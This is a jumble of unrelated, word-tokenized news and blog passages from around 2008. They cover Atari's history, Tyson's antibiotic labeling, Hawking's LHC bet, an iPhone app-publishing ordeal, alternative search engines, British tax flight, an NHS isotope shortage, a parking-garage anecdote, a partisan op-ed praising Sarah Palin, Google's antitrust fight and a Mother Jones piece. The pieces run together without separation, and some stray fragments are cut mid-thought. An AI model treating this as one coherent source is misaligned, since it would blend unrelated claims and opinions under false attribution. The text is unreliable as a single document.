However , with the Atari VCS effort , the company was firmly working outside the confines of its old business , and it required a more sophisticated marketing effort than Atari could manage on its own .
Warner Communications brought this marketing focus to the table -- as well as the vast amount of money needed to make Atari 's ideas come to life .
" Warner put a lot of money into the company , which certainly helped pay for marketing and manufacturing the games and computers . "
iv
- Alan Miller
However , the sudden oil and water mix of engineers and marketers at Atari almost single - handedly created a computer age cliché that is now common place in many failed technology companies : engineers and marketers can't coexist peacefully for very long .
" If there is anything engineers despise , it is dumb marketers defining the impossible . "
v
- Nolan Bushnell
Instead of celebrating the successful launch of the VCS in 1978 , Atari was lamenting missed opportunities and mistakes that held sales back .
While management scrambled to find ways to save the consumer business , programmers struggled to come to grips with the new technology , and R&D looked towards the future .
The eternal struggle of the marketing and engineering was set alight , and put on course to explode within the company , taking many of the pioneers along with it .
The U.S. Department of Agriculture has found that Tyson Foods routinely gave antibiotics to chicken it raised to sell as meat , and labeled it as antibiotic free .
Tyson said that the antibiotics were not a type used in humans , and so were not likely to lead to " superbugs " immune to medical treatments .
But the USDA found that in addition to the non-human antibiotic , Tyson was also using a drug commonly given to people .
The USDA told Tyson that it can no longer consider the company 's no-antibiotics label " truthful and accurate . "
Tyson disagreed but said it would end its misleading labeling ... after a federal court issued an injunction stopping them from making the claim .
Fears that the world might end because of a grand scientific experiment that begins on Wednesday have given way to something less urgent : Stephen Hawking may lose $ 100 , or gain a Nobel Prize .
Those stakes are tied to the Large Hadron Collider , which is scheduled to rev up for the first time on Wednesday at roughly 3:30 a.m.
Eastern time following 13 years of planning , $ 8 billion in spending and immeasurable anticipation , chronicled by Dennis Overbye of The New York Times .
Dr. Hawking will be one of the many physicists watching in hopes of greeting answers to some of physics ’ biggest questions when experimental data starts to stream from the collider .
But he also has a dog in this fight .
His 1974 theory on black holes could be experimentally proven — if the collider succeeds in creating black holes in the first place .
“ If the L.H.C. were to produce little black holes , I do n’t think there ’s any doubt I would get a Nobel prize , if they showed the properties I predict , ” Dr. Hawking told BBC Radio today .
“ However , I think the probability that the L.H.C. has enough energy to create black holes is less than 1 percent , so I ’m not holding my breath . ”
While some doomsayers feared that the world would be swallowed up if the collider succeeded in creating a black hole , Dr. Hawking said today that the new device was “ absolutely safe . ”
His own theory has a lot to do with his conclusion , as Mr. Overbye wrote in April :
Most theorists will say the version of their theory that predicts black holes is extremely unlikely — though not impossible .
But the chance that such a black hole would not instantly evaporate according to a theory famously propounded by Stephen Hawking in 1974 is even more weirdly unlikely , the theorists say .
Dr. Hawking ’s theory is just one of many that will be tested by the collider , which is designed to circulate streams of protons around a 17 - mile circular track buried below Switzerland and France and , by crossing streams running in opposite directions , produce collisions that illuminate particle physics in ways that are otherwise impossible to observe and measure .
One major hope for the collider is that it could establish whether the Higgs particle really exists , a goal that Dr. Hawking said ought to be well within the capabilities of the experiment , unlike his black holes .
From an Agence France - Presse transcription of his remarks :
“ The L.H.C. will increase the energy at which we can study particle interactions by a factor of four .
According to present thinking , this should be enough to discover the Higgs particle , ” Hawking told BBC radio .
“ I think it will be much more exciting if we do n’t find the Higgs .
That will show something is wrong , and we need to think again .
I have a bet of 100 dollars that we wo n’t find the Higgs . ”
That he was betting against such a discovery demonstrated once again the limitless curiosity of Dr. Hawking .
“ ” Whatever the L.H.C. finds , or fails to find , ” he said , “ the results will tell us a lot about the structure of the universe . ”
But is that worth the billions spent on the project ?
For anyone itching to post a comment to the contrary , consider the blistering argument of Dr. Hawking , who defended the collider and the space program at once .
“ Together they cost less than one tenth of a per cent of world GDP , ” he said .
“ If the human race can not afford this , then it does n’t deserve the epithet ‘ human . ’ ”
The iPhone Development Story
I just got my first application in the iTunes App Store , and I wanted to tell the story of what it 's like to publish one , from start to finish .
The app , NetAwake , is an independent project I wrote with my friend Joshua .
It makes an interesting story , I think , because unlike the sordid tale of some people 's struggle to get accepted into the iPhone developer program , my personal experience was perfectly normal .
( As far as I know . )
But even a perfectly normal experience with the iPhone developer program is intensely weird .
Compared to the simplicity of developing and distributing a Mac app , Apple 's iPhone program is extremely convoluted and strange .
Here 's the story , step by step .
1. Sign up with the iPhone Dev Center
The iPhone Dev Center is Apple 's portal page for iPhone development .
Here , you can download the SDK and find tutorial videos and documentation .
For reasons unknown to me , merely having an account with the Apple Developer Connection does not suffice .
I have to sign up again for the iPhone site .
This is pretty straightforward , however : just click through some scary legal forms and off you go .
Now I can download the SDK and get started .
2. Enroll in the iPhone Developer Program
I 'm not done signing up with stuff yet !
You see , although I signed up and clicked through the scary legal stuff and downloaded the SDK , I can't actually install any software on my iPhone .
I can read documentation , write code , compile it , and even run it in the iPhone simulator , but I can't get it onto my actual iPhone .
( And do n't think that the simulator makes for an adequate development platform .
There 's a reason it 's called a " simulator " and not an " emulator " .
Running on the real hardware ends up being pretty different . )
For this privilege , Apple makes me sign up for the developer program .
I get to fill out some more forms , click through some more scary legal stuff , and send off my request .
Request ?
That 's right , I do n't get an answer immediately .
Instead I get to ....
3. Wait
This step is going to come up again .
I believe that this time the answer came the next business day .
4. Pay
Did I mention that the program is not free ?
And remember , this is n't to distribute apps , it 's just to start realistically working on them .
$ 99 to put apps on my own iPhone .
( Or as it happens , on my own iPod Touch . )
But I pay my money and shortly afterwards I receive an activation code .
Now I 'm ready to put software on my iPhone !
Well , not quite .
5. Provision
A stock iPhone wo n't take any software that has n't been signed by Apple .
This puts us third - party guys in a bind , because we can't get Apple to sign every single build we make .
So what Apple does is allow you to create a provisioning profile .
This is a cryptographic blob which essentially tells your iPhone to accept apps signed by you and not just Apple .
To create it , we have to get the iPhone 's unique identifier ( accessible through Xcode ) and then paste it into Apple 's web form , then download the result from Apple .
Very oddly , although I am enrolled as an individual developer , I still have to make a request and then manually approve my own request before the provisioning profile can be generated .
I download the profile , install it using Xcode , and now I 'm ready to put software on my iPhone !
And if you believe that , you have n't been paying attention .
6. Certificate
I said that the provisioning profile tells the iPhone to accept software signed by you .
Well , you also need a certificate to sign with .
And of course this can't be any old certificate , but a special one made by Apple .
The process here is fairly involved .
You get to open Keychain Access , go to a little - used corner , generate a certificate request , open the result in a text editor , copy / paste the blob of random characters into Apple 's web form , and then submit it .
Then you get to download and install the result ( after placing a request , and then approving that same request ) as well as an intermediate certificate provided by Apple .
And if you 're like me , you also get to scratch your head over a bunch of really bizarre errors until you have a sudden flash of inspiration and run Keychain First Aid to fix corruption .
But now it 's all done !
My iPhone ( iPod Touch ) is provisioned , I have my certificate , I have the intermediate certificate , and I am now finally ready to put software on it .
Come on , you know better than that by now .
7. Screw about in Xcode
Of course none of this goes quite right .
There are a bunch of settings in Xcode that have to perfectly match the stuff that you gave to Apple , and they do n't start out matching .
The errors are essentially worthless .
I believe I only ever saw Xcode generate one error , over and over and over again , as it encountered a whole bunch of different problems .
But by careful log reading , insight , pure random luck , and internet searches , I finally arrive at a working system .
I build in Xcode , and the application appears on my iPhone ( iPod Touch ) .
Yes , really .
I 'm not kidding this time .
It actually worked , at last .
8. Develop !
This is what I 'm here for , after all .
Now that all the pieces are finally in place , I can get down to writing code .
( Yes , I could write code before .
But I could n't run it on the hardware that it was targeting , which made it somewhat less useful that it otherwise could be . )
As everybody knows , developing for the iPhone is a lot like developing for the Mac. Instead of Cocoa , you have Cocoa touch , which is very similar .
There are significant differences as well , though , so it takes some getting used to .
In addition to the perfectly natural difficulties encountered from working on a new platform , there 's also a big artificial difficulty .
As any experienced developer knows , a great deal of help can be had from simply talking to other developers working on the same system .
But Apple does n't let us do that !
If you 'll recall , I mentioned a bunch of scary legal stuff that you had to click through to sign up with the program .
Among all the other stuff , it included the &*% #ing NDA ( WARNING : link contains extremely large curse words ) which says that we can't talk about this stuff , with anyone , ever .
And it 's not just boilerplate .
If you read between the lines a bit on Apple 's cocoa - dev info page , they pretty much come right out and threaten to sue anyone who violates their NDA on the mailing list .
It 's not just code that takes the hit .
Xcode took a lot of magic incantations to work as well .
It would have been a lot easier if I had been able to ( legally ) talk with my fellow developers about it .
9 . Ship
At last , the product is complete , and it 's ready to be given to the customers .
Well , not quite .
This being the iPhone , Apple has a lot more hoops for me to jump through first !
I had thought that all the craziness with certificates was behind me .
I should have known better .
10 . Certificate
For reasons entirely unknown to me , a build that is intended for distribution through the iTunes App Store needs to be built with a special distribution certificate .
I do n't understand why Apple can't just sign the build with their own special certificate .
But apparently that 's not good enough .
So I go through the whole process all over again .
Keychain Access , request , approve my own request , download , install .
Now I 'm ready to ship .
I realize you 're probably getting tired of this game , so I 'll stop .
Next time I say that I 'm ready to ship , I 'll mean it .
Because of course , I 'm not ready yet !
11 . Provision
I forgot to mention that you need a special distribution provisioning profile too .
I do n't really understand why .
You can't even install the built - for - distribution app on the iPhone .
But there you have it .
12 . Screw about in Xcode
You may recognize this from step 7 .
It 's the same basic thing , but with a new twist .
There are literally pages of instructions ( admittedly , largely due to having a bunch of screenshots ) detailing how to reconfigure the Xcode project to use this special magic distribution certificate instead of the development certificate I had before .
The first time I went through these pages of instructions , I apparently missed something because when I built I got The Error instead of having things work .
When I went back and redid the instructions from the top , suddenly it worked !
13 . Submit
This involves filling out a pretty standard web form .
First they ask a bunch of basic information about the app , such as its name , its version number , a description , and whether it includes cryptography .
( Apps which include cryptography need a special license to be sold outside the United States .
As if the US had some sort of monopoly on cryptography !
And yes , this foolishness is due to Uncle Sam , not Apple . )
Next I get to a screen where I can upload the application , a large size icon , and screenshots .
I click and upload the application .
Then I do the icon .
For some reason , Apple does not accept PNG files for either the icon or the screenshots , even though that 's what their screenshot tools generate ( on both platforms ) and Mac OS X has had support for it since day one .
They do support TIFF and JPEG .
Alas , I do n't notice this prohibition at first , and I upload a PNG version of my large icon .
Somewhere in this process , something chokes , and I 'm shown a cryptic error screen .
I press the back button , and I 'm informed that my session has timed out .
I go back to the main page , log in again , and go to the applications area .
Nothing is listed .
All of my previous work has been lost , and I have to re-enter everything a second time .
Fantastic .
I go through it all a second time , this time noticing and respecting the TIFF / JPEG requirements , and I make it through successfully .
I set a price for the program , and now , at last , finally , it is ready to be purchased .
Just kidding !
I 'm sorry .
I know I said I would n't do this anymore .
But I could n't resist .
14 . Wait
The app sits in the list with this nice yellow gumdrop and a tag reading " In Review " .
There is no indication of progress , no ETA , no indication that anything is being done .
I assume that something is , but I have to take this completely on faith .
This is when I started writing this post .
While researching it , I went back and went through some of the motions that I had to do earlier on , so I could remember what they looked like .
While I was doing this , I managed to hit all the right buttons to sign up with the iPhone Developer Program .
Not one to let sanity stand in their way , Apple happily accepted my submission a second time .
And so my account was thrown back in time , from being enrolled to once again waiting for acceptance .
I quickly sent off an e-mail to Apple requesting help , and then sat down for some low level panic .
Fortunately , my status was changed back to being accepted within a couple of hours .
Apple finally replied to my frantic request for help last week , about three weeks after I sent it .
You'd think that with the NDA in place preventing us from helping each other , the least Apple could do would be to answer their e-mails in a timely fashion .
15 . Get Rejected
About a week later , I get an e-mail from Apple .
Would n't you know it , Apple can't make the thing work , so they reject the application .
This e-mail is actually pretty decent , with the majority of it obviously written by an actual human about my particular case .
When I write back to ask if they had run through NetAwake 's troubleshooting guide , they reply within just a few hours to say that they had and it did n't help .
Good on them for being so responsive !
Of course this puts my partner and me in a tough situation .
The program works fine on our networks , but not on Apple's .
And while Apple was nice about responding to my query , it 's obvious that I can't get them to bust out a network sniffer and tell me about their router configuration .
After a great deal of thought we come up with a couple of things that might help it work on Apple 's network , apply the fixes , and are ready to try them out on Apple .
16 . Screw about in Xcode
This time it does n't take nearly as long , but Xcode still has to put up some token resistance .
There are two code - signing files that are supposed to be embedded in the application , and only one shows up in my initial build .
After some clean building and a great deal of cussing , suddenly both of them show up , and I 'm good to go .
17 . Resubmit
Fortunately Apple provides a streamlined process for submitting a new build of a rejected application .
A special link appears in the application 's information on the submission site , and uploading the new application is just a couple of clicks away .
18 . Wait
Of course once you 're rejected you go to the back of the line , and I get to wait another week to see if the fixes did the trick or not .
19 . Get Rejected Again
A week after resubmitting ( nearly three weeks after the original submission ) , another e-mail from Apple arrives .
This time they 've found a legitimate bug in the application , and have rejected it because of that .
This is perfectly understandable , and is actually a very good service they provide .
But it is extremely annoying to have to wait a week to discover that they 've found a bug , and then wait another week to see if the fix works for them .
( Note , I 'm not saying that the first rejection was n't a bug .
Maybe it was , maybe it was n't .
I do n't really have enough information to say one way or the other .
This one definitely was , though . )
20 . Re-Resubmit
My partner makes the fix , I submit again , and the waiting game begins .
This is somewhat nail - biting by now , because not only is it possible that our bug fix did n't quite work and we 've just wasted another week ( although unlikely ) , but because of this bug we still do n't know whether our fix for the original rejection worked .
21 . Wait Again
Of course it takes Apple another week to check our new submission .
As explained , much nail biting ensues .
22 . Accepted !
Finally , nearly a month after the original submission , the application is accepted by Apple and appears in the store .
It spent longer going through Apple 's approval process than it did in development !
And while Apple did find a legitimate bug , spending a month in limbo for a single bug is a very poor tradeoff .
Conclusion
Development for iPhone is an incredibly difficult process , much more difficult than it needs to be .
The arduous process of shipping an application for the Mac suddenly appears to be absolutely straightforward after going through this mess .
I really do n't envy those companies who have staked their success to the iPhone platform .
The amount of arbitrary hassle , uncertainty , and delay in the process can only feel vastly worse when your livelihood depends on it .

Back in the mists of time , a couple of Stanford PhD students called Larry and Sergey came up with an idea to make searching on the web better .
This they undoubtedly did .
But skulking in the low - rent dens of Silicon Valley and elsewhere an army of wannabe moguls work tirelessly on usurping the Mountain View giant .
Whether for niche searches or for the whole web search prize , whether by human - powered or visual methods , whether by developing cunning semantic algorithms or by Social means , all these platforms have one thing in common : they all want to take a bite out of Google.com 's posterior .
Quintura provides contextual visual search , and has long been touted as a genuine contender for the next - gen search king crown .
You enter a search string or hover your mouse over a tag in the visually represented cloud .
The cloud drills down and offers you more tags to hover over , and drills down again until you have reached the tag you want .
High - profile converts like ReadWriteWeb.com and the Maxim stable of websites may just bring Quintura into the mainstream .
Kartoo , a visual meta - search engine , has attracted more than its fair share of attention .
Supposed to make search ' fun ' , or something , by lobbing in a Flash interface for your search map .
Takes too long to load , but on the plus side boasts a feature - rich interface and page previews , not to mention a genie riding a surf - board .
'Search The Tail takes Google a step further by allowing users to narrow their search results by using either popular keywords or obscure terms .
The keyword list , namely Google Tail , is in order of popularity .
' Whatever this is , it looks like nothing you 've seen before .
It 's like Michelangelo and Steve Jobs got together to do visual search .
If there was ever a website that 's gonna help you to pick up chicks down at Starbucks just by looking at it , you 've found it .
So that 's good enough for us then .
Apart from being stunning - looking , you can target search to stuff like stocks , news etc .
Well worth a look Exalead is a French SE which provides thumbnail page previews of results , and shows various extra information on the results page including maps , file types , categories , rich media and so on .
Apparently you can also use it to cheat at crosswords .
Mahalo is touted as ' The First Human - Powered Search Engine ' , and it 's here to help .
Set up by Weblogs co-founder Jason Calcanis last year , the Mahalo community filters out garbage links and provides you with quality pages and multimedia for your searches .
Popular topics have their own ' Guide Notes ' with all the essential information you are likely to need ( eg here ) .
Of all the current human - powered Web search alternatives , Mahalo is probably the most likely to succeed in the niche , given exceptional growth over the past year .
Trexy is a meta search - engine which relies on the ' Search Trails ' of users to streamline the search process .
If someone has made a particular query before you , and had to wade through several resources to get to the information required , then that 's information that is useful to you .
This search tool provides you with this information , so you can in theory avoid the mistakes made by those coming before .
To see how the trails work , look at this query for ' how did Columbus discover America ' .
Trexy generated a lot of hype soon after launch in 2006 ... and promptly fell off the radar .
Clustered search results .
' Instead of delivering millions of search results in one long list , our search engine groups similar results together into clusters .
Clusters help you see your search results by topic so you can zero in on exactly what you ’re looking for or discover unexpected relationships between items .
' True Knowledge 's ' Answer Engine ' aims to streamline the process of getting a specific answer to your question .
It does this by ' structuring data in a way that enables computers to work and think like humans do , drawing inferences and conclusions when needed to find the information that 's requested . '
This thing is in Private Beta , so we can't tell you how good it is .
But you can already use its API to utilize the platform in your Web services .
In fact there are already a small army of specialized API services for stuff like IP Geolocation and ' phone - number - to - location ' .
Members essentially vote on documents which relate to a specific search term , so you should get good results .
Unfortunately , Stumpedia 's
Web search has a long way to go -- we tried ' Google history ' and ' computer virus ' , and both returned the dreaded ' No Results Found ' message .
But there 's better news elsewhere .
A recent new addition is the ' Instant Answers ' service , which simply connects people to the Stumpedia community , with a view to answering queries .
You use a sort - of IM client to connect with people , ask them a question , and wait for a reply .
. Xoost is one of the front - runners in the burgeoning ' social search ' scene , which overlaps in a significant way with the ' human search ' movement .
You enter a search string as per normal , and get your regulation results .
But ... your experiences in finding relevant information are saved and shared with other users , and so the system learns how to hone in on better results .
Go to Xoost to grab an invite to the Beta , if you 're interested .
ChaCha invites you to ask any question in plain English from via Cell phone SMS or over the Web .
Currently in Beta , ChaCha relies on human ' Guides ' to answer questions , and then send the answer back to you via SMS / Web .
A Note on Semantic Search : Semantic search relies primarily on content being in RDF format , which is a particularly rich descriptive format .
One drawback to Semantic search is that results take aaaaggggeeesss to get back to you .
These things have to do a lot more drilling to get more accurate information from the deep recesses of the Web .
Microsoft recently opened up its fat wallet to buy Powerset , a search engine which enables natural - language queries .
The move ended lengthy speculation surrounding the company 's future , and put to bed persistent rumors that Google was willing to break the bank to acquire the start - up .
VentureBeat explains the attraction : ' Powerset , of San Francisco , has developed a technology that attempts to understand the full meanings of phrases you type in while searching , and it returns results based on that understanding .
By buying Powerset , Microsoft is hoping to close the perceived quality gap with Google 's search engine . '
At the moment , PowerSet only works its natural - language magic on Wikipedia articles .
Like this Hakia is one of the most serious players in the Semantic Search space , and up to Dec '07 Hakia had raised $ 18 m in funding .
Hakia 's quest for quality results hinges on three simultaneous criteria : that " It ( 1 ) comes from credible sources ( verticals ) recommended by librarians , ( 2 ) is the most recent information available , and ( 3 ) is absolutely relevant to the query " .
Services include Web search , embeddable search , Web services and an API are available .

A super - simple Flash interface makes Seeqpod a pleasure to use .
This thing makes us feel like Beavis and Butthead when they saw the auto - flushing urinals at the Grand Canyon .
Midomi allows you to find music with your voice .
Just sing or hum the tune , and Midomi will tell you what it is , and where to get it .
The service relies on comparing your tune with previous queries made by community members , so it will require a high level of adoption before it becomes really useful .
But when it does , you 'll never have that annoying ' What was that song called again ? ' moment ever again .
You can also perform a conventional text search , but where 's the fun in that ?
There 's a whole bunch of other cool community - oriented stuff on Midomi , which is still in Beta .

LONDON — Already struggling with an economy on the brink of recession and a record budget deficit , Britain is facing a potential new problem : an exodus of British companies fleeing the tax system .
In the last week alone , three companies have announced plans to move their headquarters abroad before the end of the year .
They say they are trying to cut their tax bills and frustrated by a lack of clarity about future tax rules .
The Henderson Group , a London - based asset management firm , and Charter , an engineering company , plan to move to Ireland .
The Regus Group , the office space and business services provider , is leaving for Luxembourg .
And at least two more companies , the advertising agency WPP Group and insurer Brit Insurance , said they might follow .
The moves , which have started intense discussions among lawmakers and businesses about the competitiveness of Britain ’s tax system , could not come at a worse time .
The government is expected to take in billions less in tax revenue because of losses at financial firms affected by the credit crisis .
Merrill Lynch , for instance , may avoid paying taxes here for years after booking $ 29 billion in losses related to the United States subprime mortgage market through its British unit .

Until then , he ’s doing his patriotic duty .

Hundreds of important NHS hospital tests could be put on hold Hundreds of important NHS hospital tests could be put on hold due to a worldwide shortage of a radioactive isotope , doctors have warned .
Three of the five reactors which produce molybdenum - 99 have been shut down , severely reducing the amount available .
Specialists said urgent tests would have to be prioritised .
However , they are concerned that waiting time targets in England may interfere with their planning .
The problem is likely to continue until the end of September at least .
It is likely to get worse before it gets better
Professor Alan Perkins
British Nuclear Medicine Society
A wide variety of tests , such as heart and kidney function tests and bone scans ( including those looking for tumours ) , involve the injecting of dyes which use molybdenum - 99 .
It is produced from uranium using a nuclear reactor and , as it has a half - life of less than three days , it can not be stockpiled but has to be transported and used as soon as it is produced .
There are three commercial reactors in Europe which produce the isotope and all of them are currently closed - two for planned maintenance , and the other because of an unexpected problem .
Since last weekend , the NHS has been receiving approximately half its normal supply , and this is expected to dwindle further in the weeks to come .
Six week worry Professor Alan Perkins , the honorary secretary of the Sydenham - based British Nuclear Medicine Society , said that while most tests could be delayed for a short time , others needed to be carried out within days and hospitals would have to prioritise patients accordingly .
In England , hospitals are expected to provide tests for patients inside six weeks and Prof Perkins said he feared that a non-urgent patient approaching that deadline might be given priority instead of one with an immediate need .
He said : " It is likely to get worse before it gets better .
In some cases patients can be given a different kind of investigation , such as an MRI scan .
" However , patients will need to be prioritised in terms of clinical needs and we are concerned that in some cases there will be pressure to meet waiting targets - which could prevent this happening .
" Some people have already contacted us to say that this has been the outcome . "
Other parts of the UK do not have the six - week testing target .
Urgent priority
This is not the first time that supplies have been hit by a reactor shutdown - a stoppage at a Canadian reactor last year delayed thousands of tests .
In the long term , Professor Perkins said , the UK should consider investing in a new reactor to help reduce its reliance on ageing facilities in other countries .
A spokesman for the Department of Health said it was aware of the problem and that hospitals would be taking steps to cope with it .
" The impact will vary from trust to trust , depending largely on the test being carried out , how urgent it is , and of course the flow of supply .
" Urgent patients will continue to be prioritised .
Routine patients may need to wait a little longer until supply comes back on - line . "

You were about fifty feet in front of me .
I was going to turn right .
You turned right .
Soon , I was going to turn left .
You turned left .
I tried walking slower to let you get ahead of me .
Unfortunately , you decided to walk slower at the exact moment I did .
I then decided to start walking very fast , so that I could pass you by , let you be in control of the situation by being behind me .
You started walking fast at the exact moment I did .
I considered taking another turn or stopping for a smoke .
Anything to let you get way ahead of me , to get me off of your path so that you could relax because I know you thought you were being followed by a strange man .
It was cold as fuck outside though , so I continued walking toward my destination , a parking garage .
I somehow knew this was your destination as well .
You walked into the sanctuary of the garage , and I paused to have a smoke .
With the luck I was having , you were probably parked right next to me and the coincidence would press the situation enough for me to get maced , I thought .
The freezing wind helped me smoke my cigarette down to the filter in record time , but I thought my nicotine break gave you enough time to get to your car without some strange guy on your heels .
I got in the elevator and pushed the button for the fifth floor , where I was parked .
The elevator stopped on floor 3 .
The doors opened .
And there you were .
You forgot where you parked .
I would n't have been offended if you did n't get on the elevator , but you did .
You shrank away from me , and I could your fear along with the strong fragrance of whatever alcohol you had been drinking all evening .
You did n't push a button on the elvator .
Of course , you were getting off on my floor .
Shit .
I wanted to get off the elevator first to show you that I was n't stalking you , to let you walk behind me for a change .
Unfortunately , when the elevator doors parted you were off like a horse at the gate .
You walked fast , I walked slowly .
We were both headed in the same direction , again .
It was at this point that I started to become a bit angry , not so much at you , but at the truths of society that helped to create this uncomfortable situation .
So I walked slowly , and felt like the killer in a B horror movie who always catches up with the victim no matter how slowly he walks or how quickly the female victim runs .
To make things worse , a penny was stuck in the grooves of the sole of my shoe .
You walked quickly , and behind you you heard the " clink - clomp " of my shoe and penny laden shoe hitting the hard concrete .
You panicked at this point , I think .
Thankfully , you I saw you turn left up the ramp , and I went right , toward my car .
The parking deck was empty of cars , save mine and one parked right next to it .
I absolutely knew the car next to mine was yours .
You were now wandering around the sixth floor I think , either avoiding me and waiting for me to leave or truly drunk and lost .
I got in my car , started it up and let it warm up a bit .
I wanted to help you .
. . and then I saw you in my rearview mirror .
Miss , whomever you are , please do n't ever accept a ninja or spy job , because you are horrible at trying to conceal yourself from view .
Maybe it was the bright pink scarf dangling over the edge of the ramp or the fact that you were perched right underneath a bright halogen lamp , but I could not only see you trying to hide , watching me in my car , but you stuck out like a turd in a punch bowl .
I sighed , put my car into gear , and backed out of my space .
I backed out a bit too far , cut the wheel and found my headlights right on you , completely illuminating and exposing your already horrible hiding place .
Your eyes looked haunted , like that famous National Geographic cover featuring the woman with the ' haunted eyes .
'
The apology : I 'm truly , truly sorry that at that point I flashed my brights and honked my horn at you like I was firing a machine gun .
You jumped and , I think , screamed , but at this point the whole situation had gone too far for me .
I also think you needed to sober up a bit more before you got behind the wheel of your car .
As I pulled away , I smiled and waved at you .
You gave me the finger .
I probably deserved your wrath at this point , but please :
In the future , get someone to walk you back or take a cab .
You stink at being stealthy .
I hope your hangover was n't too bad .

I 've been trying to convince my fellow conservatives that they have been wasting their time in a fruitless quest for a new Ronald Reagan to emerge and lead our party and our nation .
I insisted that we'd never see his like again because he was one of a kind .
I was wrong !
Wednesday night I watched the Republican National Convention on television and there , before my very eyes , I saw my Dad reborn ; only this time he 's a she .
And what a she !
In one blockbuster of a speech , Alaska Gov. Sarah Palin resurrected my Dad 's indomitable spirit and sent it soaring above the convention center , shooting shock waves through the cynical media 's assigned spaces and electrifying the huge audience with the kind of inspiring rhetoric we have n't heard since my Dad left the scene .
This was Ronald Reagan at his best -- the same Ronald Reagan who made the address known now solely as " The Speech , " which during the Goldwater campaign set the tone and the agenda for the rebirth of the traditional conservative movement that later sent him to the White House for eight years and revived the moribund GOP .
Last night was an extraordinary event .
Widely seen beforehand as a make - or - break effort -- either an opportunity for Sarah Palin to show that she was the happy warrior that John McCain assured us she was , or a disaster that would dash McCain 's presidential hopes and send her back to Alaska , sadder but wiser .
Obviously un-intimidated by either the savage onslaught to which the left - leaning media had subjected her , or the incredible challenge she faced -- and oozing with confidence -- she strode defiantly to the podium and proved she was everything and even more than John McCain told us .
Much has been made of the fact that she is a woman .
What we saw last night , however , was something much more than a just a woman accomplishing something no Republican woman has ever achieved .
What we saw was a red - blooded American with that rare , God -given ability to rally her dispirited fellow Republicans and take up the daunting task of leading them -- and all her fellow Americans -- on a pilgrimage to that shining city on the hill my father envisioned as our nation 's real destination .
In a few words she managed to rip the mask from the faces of her Democratic rivals and reveal them for what they are -- a pair of old - fashioned liberals making promises that cannot be kept without bankrupting the nation and reducing most Americans to the status of mendicants begging for their daily bread at the feet of an all - powerful government .
Most important , by comparing her own stunning record of achievement with his , she showed Barack Obama for the sham that he is , a man without any solid accomplishments beyond conspicuous self - aggrandizement .
Like Ronald Reagan , Sarah Palin is one of us .
She knows how most of us live because that 's the way she lives .
She shares our homespun values and our beliefs , and she glories in her status as a small - town woman who put her shoulder to the wheel and made life better for her neighbors .
Her astonishing rise up from the grass - roots , her total lack of self - importance , and her ordinary American values and modest lifestyle reveal her to be the kind of hard - working , optimistic , ordinary American who made this country the greatest , most powerful nation on the face of the earth .
As hard as you might try , you wo n't find that kind of plain - spoken , down - to - earth , self - reliant American in the upper ranks of the liberal - infested , elitist Democratic Party , or in the Obama campaign .
Sarah Palin did n't go to Harvard , or fiddle around in urban neighborhood leftist activism while engaging in opportunism within the ranks of one of the nation 's most corrupt political machines , never challenging it and going along to get along , like Barack Obama .
Instead she took on the corrupt establishment in Alaska and beat it , rising to the governorship while bringing reforms to every level of government she served in on her way up the ladder .
Welcome back , Dad , even if you 're wearing a dress and bearing children this time around .
This is a big week for Google .
Its new mobile phone software called Android is debuting , and there will be much debate about whether this much hyped project is going to get any traction .
But that discussion may get drowned out by another .
It seems as if everywhere you turn in the past two weeks , someone is wringing their hands about Google , the monopolist .
Google is trying to get a mega advertising deal with Yahoo approved by the Justice Department .
Advertising agencies , a bunch of big and small advertisers and - big surprise - Microsoft , are all crying that Google is hell bent on world domination and want the deal blocked .
Google says the accusations are ridiculous and has stepped up its defense in recent days to press that point .
It says Microsoft is n't really credible on antitrust matters , after all .
Moreover , it 's hard to be a monopolist when you do n't have any pricing power .
Google ads are
auctioned to the highest bidder , not sold in the conventional sense .
Easy , right ?
Wrong .
The truth is , Google has more control over pricing than it lets on , and it is going to need to do a better job of explaining that in the coming weeks if it does n't want to see this deal - and maybe all future deals - go down in flames .
It is absolutely true that Google 's ads are auctioned , but it is also true that Google sets minimum bids for those auctions on an advertiser by advertiser basis .
That means that if Google does n't like you as an advertiser , your price per click - the way advertisers bid on
Google ads - will have to be higher to get top placement in search results than an advertiser Google likes a lot .
How do you know whether Google likes you or not , if you 're an advertiser ?
The answer to that question used to be clear .
If your ad was popular , it meant Google liked you , and you had to pay less per click than if your ad was unpopular .
If your ad was unpopular , it often did n't get listed at all .
But you knew what to do .
You made it better and tried again .
Advertisers whined about all this at first , but when they saw how much better their ads performed compared to other networks , like Yahoo's , they shut up .
Indeed , Google 's obsession with ad 's quality is at the root of why it is such a successful company .
So what 's different ?
Google has made the way it measures ad quality a lot more complicated , and it has n't done a very good job of letting advertisers understand what all those variables are and how each one affects the overall measurement of ad quality .
For example , part of an ad's quality score now depends on whether dozens of raters working for
Google around the world like your site and the ads on your site .
Google 's position is that it does n't want users clicking on Google ads and getting taken to sites that are n't " useful . "
Google says this approach improves the user experience , and it probably does .
However , the changes also mean that it has become harder and harder for advertisers to understand how to tweak their search ads to get the best placement - and they no longer have any real choice about where else to go .
I do n't believe that Google is becoming another Microsoft .
It is not using its position to unfairly crush competitors .
Indeed , part of he reason Google added so many quality measures to its ad bidding process
was to stop ad arbitrageurs from gaming its system .
And I think Google has succeeded .
Indeed , Google executives openly talk about how improvements in ad 's quality allows it to show fewer , but better ads .
Because the ads work better , both Google and its advertisers benefit .
But the world applies different standards of behavior to corporate heavyweights than to young fast growing companies .
When you 're the latter , as Google has been for most of the past 10 years , telling your customers that you are doing what 's good for them - and delivering -
makes you brilliant .
When you are the Google of today , it can also make you seem arrogant and pushy .
More transparency would do wonders .
Even Google 's biggest supporters have criticized it for becoming something of a black box to the outside world .
I understand why Google does n't want to do this .
But stubbornness in the face of antitrust cops , as Microsoft will surely attest , enables you to win a few battles , but ultimately lose the war .
we are far too young and clever
For indispensable reporting on the coronavirus crisis , the election , and more , subscribe to the Mother Jones Daily newsletter .
At the end of June , as the subprime mortgage crisis was driving the economy into a tailspin , Charles Steele Jr. , the president of the Southern Christian Leadership Conference ( SCLC ) , took to the op - ed page of the Washington Post to decry the devastating effect the meltdown was having on minority homeowners .
But rather than support currently pending measures to better regulate the credit markets , the leader of one of the nation ’s oldest civil rights groups instead attacked them .
Steele was particularly upset about a Federal Reserve proposal that would crack down on subprime credit cards — high - interest cards marketed to people with bad credit .
Steele rose to the card issuers ’ defense , invoking his group ’s founder , Martin Luther King Jr. , and claiming that any move to regulate the cards would deny minorities access to much - needed credit .
